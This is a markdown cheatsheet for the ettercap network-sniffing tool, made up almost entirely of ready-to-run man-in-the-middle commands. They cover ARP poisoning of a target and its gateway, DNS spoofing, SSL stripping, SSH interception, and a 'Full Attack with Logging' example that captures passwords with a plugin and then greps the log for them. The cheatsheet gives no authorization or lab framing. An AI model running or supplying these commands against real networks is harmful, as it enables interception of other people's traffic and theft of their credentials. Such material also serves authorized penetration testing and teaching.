---
title: "ettercap Cheatsheet"
description: "Quick reference guide for ettercap MITM attack suite"
tool: ettercap
category: network-sniffing
difficulty: intermediate
requires_root: true
---

# ettercap Cheatsheet

## Quick Start

```bash
# Install ettercap
sudo apt install ettercap-graphical

# Start graphical mode
sudo ettercap -G

# Start text mode
sudo ettercap -T

# Basic ARP poisoning
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
```

## Capture Filters

```bash
# ARP poisoning
sudo ettercap -T -i eth0 -M arp:remote /TARGET// /GATEWAY//

# DNS spoofing
sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /TARGET//

# SSL interception
sudo ettercap -T -i eth0 -M arp:remote -P sslstrip /TARGET//

# SSH interception
sudo ettercap -T -i eth0 -M arp:remote -P sshmitm /TARGET//
```

## Analysis

```bash
# Verbose output
sudo ettercap -T -i eth0 -v

# Quiet mode
sudo ettercap -Tq -i eth0

# Write to file
sudo ettercap -T -i eth0 -w capture.pcap

# Log to file
sudo ettercap -T -i eth0 -L attack.log
```

## Common Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-G` | Graphical mode | `ettercap -G` |
| `-T` | Text mode | `ettercap -T` |
| `-i` | Interface | `ettercap -i eth0` |
| `-M` | MITM type | `ettercap -M arp:remote` |
| `-P` | Plugin | `ettercap -P dns_spoof` |
| `-w` | Write pcap | `ettercap -w capture.pcap` |
| `-L` | Log file | `ettercap -L attack.log` |
| `-S` | Lua script | `ettercap -S script.lua` |
| `-v` | Verbose | `ettercap -v` |
| `-q` | Quiet | `ettercap -Tq` |

## Target Specification

```bash
# Single target
/192.168.1.100//

# Target range
/192.168.1.1-100//

# MAC address
//00:11:22:33:44:55//

# Exclude target
/192.168.1.100/ !/192.168.1.1/

# Subnet
/192.168.1.0//
```

## MITM Types

```bash
# ARP poisoning (remote)
-M arp:remote

# ARP poisoning (local)
-M arp

# ICMP redirect
-M icmp

# DHCP spoofing
-M dhcp:spoof

# Port stealing
-M port:steal
```

## Plugins

```bash
# List plugins
ettercap -l

# Load plugin
ettercap -T -P <plugin>

# Common plugins
-P dissectors          # Protocol dissectors
-P passwords           # Password capture
-P dns_spoof           # DNS spoofing
-P sslstrip            # SSL stripping
-P sshmitm             # SSH MITM
-P remote_browser      # Browser injection
-P filter              # Packet filtering
-P voip                # VoIP capture
```

## Examples

### Basic ARP Poisoning
```bash
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
```

### DNS Spoofing
```bash
sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /192.168.1.100//
```

### SSL Interception
```bash
sudo ettercap -T -i eth0 -M arp:remote -P sslstrip /192.168.1.100//
```

### Full Attack with Logging
```bash
sudo ettercap -T -i eth0 \
  -M arp:remote \
  -P dissectors \
  -P passwords \
  -L attack.log \
  /192.168.1.100// /192.168.1.1//
```

## Chaining with Other Tools

```bash
# Pipe to Wireshark
sudo ettercap -T -i eth0 -w - | wireshark -k -

# Log analysis
grep -i "password" attack.log

# Use in tmux
tmux new-session -d -s ettercap 'sudo ettercap -T -i eth0'

# Process with tcpdump
tcpdump -r capture.pcap -w filtered.pcap 'tcp port 80'
```

## Quick Reference

### Target IPs
- Gateway: `192.168.1.1`
- Target: `192.168.1.100`
- Subnet: `192.168.1.0/24`

### Common Ports
- FTP: 21
- Telnet: 23
- HTTP: 80
- HTTPS: 443
- SSH: 22
- DNS: 53
- MySQL: 3306
- RDP: 3389

### Protocol Keywords
- `arp` - ARP protocol
- `tcp` - TCP protocol
- `udp` - UDP protocol
- `icmp` - ICMP protocol
- `dns` - DNS protocol
- `http` - HTTP protocol
- `ftp` - FTP protocol
- `ssh` - SSH protocol
